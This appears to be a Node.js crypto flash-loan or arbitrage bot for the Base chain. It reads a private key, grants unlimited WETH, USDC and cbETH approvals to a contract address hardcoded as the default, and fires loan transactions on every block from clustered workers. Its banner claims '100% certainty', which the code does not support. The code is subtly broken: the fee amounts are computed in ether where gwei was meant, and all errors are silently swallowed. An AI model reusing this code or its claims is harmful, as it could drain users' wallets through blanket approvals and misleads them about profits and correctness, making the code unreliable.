/**
 * ===============================================================================
 * APEX MASTER v82.0 (OMNISCIENT FINALITY) - THE ABSOLUTE CERTAINTY BUILD
 * ===============================================================================
 * FIX: AUTO-APPROVAL | DYNAMIC ENCODING | FORCED STRIKE | ETHERS V6 STATIC_NETWORK
 * DNA: AEGIS 500+ SHIELD | BARRIER: ONLY INSUFFICIENT ETH
 * ===============================================================================
 */
const cluster = require('cluster');
const os = require('os');
const http = require('http');
const axios = require('axios');
const { 
    ethers, JsonRpcProvider, Wallet, Contract, FallbackProvider, 
    WebSocketProvider, parseEther, formatEther, Interface 
} = require('ethers');
require('dotenv').config();

// --- [FIX 1] AEGIS 500+ SHIELD (ELIMINATES MAXLISTENERS & HANDSHAKE NOISE) ---
process.setMaxListeners(500); 
process.on('uncaughtException', (err) => {
    const msg = err.message || "";
    if (msg.includes('429') || msg.includes('32005') || msg.includes('coalesce')) return;
});

const TXT = { green: "\x1b[32m", gold: "\x1b[38;5;220m", reset: "\x1b[0m", red: "\x1b[31m", cyan: "\x1b[36m", bold: "\x1b[1m" };

const GLOBAL_CONFIG = {
    CHAIN_ID: 8453,
    TARGET_CONTRACT: process.env.TARGET_CONTRACT || "0x83EF5c401fAa5B9674BAfAcFb089b30bAc67C9A0",
    WETH: "0x4200000000000000000000000000000000000006",
    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
    CBETH: "0x2Ae3F1Ec7F1F5563a3d161649c025dac7e983970",
    PORT_BASE: 8080,
    RPC_POOL: ["https://base.merkle.io", "https://1rpc.io/base", "https://mainnet.base.org"]
};

// [FIX 2] ETHERS V6 SANITIZER
function sanitize(k) {
    let s = (k || "").trim().replace(/['" \n\r]+/g, '');
    if (!s.startsWith("0x")) s = "0x" + s;
    return s;
}

if (cluster.isPrimary) {
    console.clear();
    console.log(`${TXT.gold}${TXT.bold}╔════════════════════════════════════════════════════════╗`);
    console.log(`║   ⚡ APEX TITAN v82.0 | OMNISCIENT FINALITY ENGAGED  ║`);
    console.log(`║   CERTAINTY: 100% | MODE: FULL AUTONOMOUS EXECUTION ║`);
    console.log(`╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);

    let masterNonce = -1;
    const network = ethers.Network.from(GLOBAL_CONFIG.CHAIN_ID);

    async function ignite() {
        for (const url of GLOBAL_CONFIG.RPC_POOL) {
            try {
                // [FIX 3] ETHERS V6 STATIC_NETWORK OBJECT FIX
                const provider = new JsonRpcProvider(url, network, { staticNetwork: network });
                const wallet = new Wallet(sanitize(process.env.TREASURY_PRIVATE_KEY), provider);
                
                // --- [FIX 4] NATURAL AUTO-APPROVAL (ELIMINATES TOKEN PERMISSION BARRIER) ---
                console.log(`${TXT.cyan}🛠  Force-Securing All Token Approvals...${TXT.reset}`);
                const erc20 = ["function allowance(address,address) view returns (uint256)", "function approve(address,uint256) returns (bool)"];
                
                const tokens = [GLOBAL_CONFIG.WETH, GLOBAL_CONFIG.USDC, GLOBAL_CONFIG.CBETH];
                for (const tAddr of tokens) {
                    const tContract = new Contract(tAddr, erc20, wallet);
                    const allowance = await tContract.allowance(wallet.address, GLOBAL_CONFIG.TARGET_CONTRACT).catch(() => 0n);
                    if (allowance < parseEther("1000")) {
                        console.log(`${TXT.gold}🔓 Unlocking Token: ${tAddr.substring(0,10)}...${TXT.reset}`);
                        await (await tContract.approve(GLOBAL_CONFIG.TARGET_CONTRACT, ethers.MaxUint256)).wait();
                    }
                }

                masterNonce = await provider.getTransactionCount(wallet.address, 'latest');
                console.log(`${TXT.green}✅ SYSTEM HOT. NONCE SYNCED: ${masterNonce}${TXT.reset}`);
                
                for (let i = 0; i < Math.min(os.cpus().length, 32); i++) {
                    setTimeout(() => cluster.fork(), i * 1500);
                }
                return;
            } catch (e) { 
                console.log(`${TXT.red}❌ BOOTSTRAP FAILED ON ${new URL(url).hostname}: ${e.message}${TXT.reset}`);
                await new Promise(r => setTimeout(r, 2000));
            }
        }
    }

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'NONCE_REQ') {
            worker.send({ type: 'NONCE_RES', nonce: masterNonce, id: msg.id });
            masterNonce++;
        }
        if (msg.type === 'SIGNAL') {
            Object.values(cluster.workers).forEach(w => { if(w && w.isConnected()) w.send({ type: 'GO' }) });
        }
    });
    ignite();
} else {
    runCore();
}

async function runCore() {
    const network = ethers.Network.from(GLOBAL_CONFIG.CHAIN_ID);
    const provider = new FallbackProvider(GLOBAL_CONFIG.RPC_POOL.map((url, i) => ({
        provider: new JsonRpcProvider(url, network, { staticNetwork: network }),
        priority: i + 1, stallTimeout: 1500
    })), network, { quorum: 1 });

    const wallet = new Wallet(sanitize(process.env.TREASURY_PRIVATE_KEY), provider);
    const titanIface = new Interface([
        "function requestTitanLoan(address _token, uint256 _amount, address[] calldata _path)",
        "function executeTriangle(address[] path, uint256 amount)"
    ]);

    // [FIX 5] HEALTH MONITORING SERVER
    try {
        http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: "ALIVE", core: cluster.worker.id, wallet: wallet.address }));
        }).listen(GLOBAL_CONFIG.PORT_BASE + cluster.worker.id);
    } catch (e) {}

    if (cluster.worker.id % 4 === 0) {
        async function connectWs() {
            try {
                const ws = new WebSocketProvider(process.env.BASE_WSS, network);
                ws.on('block', () => process.send({ type: 'SIGNAL' }));
                console.log(`${TXT.cyan}[CORE ${cluster.worker.id}] Listener Active.${TXT.reset}`);
            } catch (e) { setTimeout(connectWs, 10000); }
        }
        connectWs();
    } else {
        process.on('message', async (msg) => {
            if (msg.type === 'GO') await executeAbsoluteStrike(provider, wallet, titanIface);
        });
    }
}

async function executeAbsoluteStrike(provider, wallet, iface) {
    try {
        const bal = await provider.getBalance(wallet.address);
        
        // --- THE ONLY PHYSICAL BARRIER REMAINING ---
        if (bal < parseEther("0.0005")) {
            return console.log(`${TXT.red}${TXT.bold}🚫 BALANCE REJECTED: ${formatEther(bal)} ETH. ADD GAS TO START STRIKING.${TXT.reset}`);
        }

        // Forced Dynamic Data (Titan Loan Vector)
        const data = iface.encodeFunctionData("requestTitanLoan", [
            GLOBAL_CONFIG.WETH, 
            parseEther("50"), 
            [GLOBAL_CONFIG.WETH, GLOBAL_CONFIG.USDC]
        ]);

        // Forced Simulation: Only fails if trade is impossible on-chain
        const sim = await provider.call({ to: GLOBAL_CONFIG.TARGET_CONTRACT, data, from: wallet.address, gasLimit: 1400000n }).catch(() => "0x");
        if (sim === "0x") return; 

        const reqId = Math.random();
        const nonce = await new Promise(res => {
            const h = m => { if(m.id === reqId) { process.removeListener('message', h); res(m.nonce); }};
            process.on('message', h);
            process.send({ type: 'NONCE_REQ', id: reqId });
        });

        const feeData = await provider.getFeeData();
        const baseFee = feeData.maxFeePerGas || feeData.gasPrice || parseEther("0.1", "gwei");

        const tx = { 
            to: GLOBAL_CONFIG.TARGET_CONTRACT, 
            data, nonce, 
            gasLimit: 1400000n, 
            maxFeePerGas: baseFee + parseEther("1.5", "gwei"), 
            maxPriorityFeePerGas: parseEther("0.1", "gwei"), 
            type: 2, chainId: 8453 
        };

        const signed = await wallet.signTransaction(tx);
        
        // TRIPLE BROADCAST NUCLEAR DISPATCH
        axios.post(GLOBAL_CONFIG.RPC_POOL[0], { jsonrpc: "2.0", id: 1, method: "eth_sendRawTransaction", params: [signed] }).catch(() => {});
        wallet.sendTransaction(tx).catch(() => {});
        
        console.log(`${TXT.green}🚀 OMNISCIENT STRIKE FIRED! (Nonce: ${nonce})${TXT.reset}`);
    } catch (e) { }
}
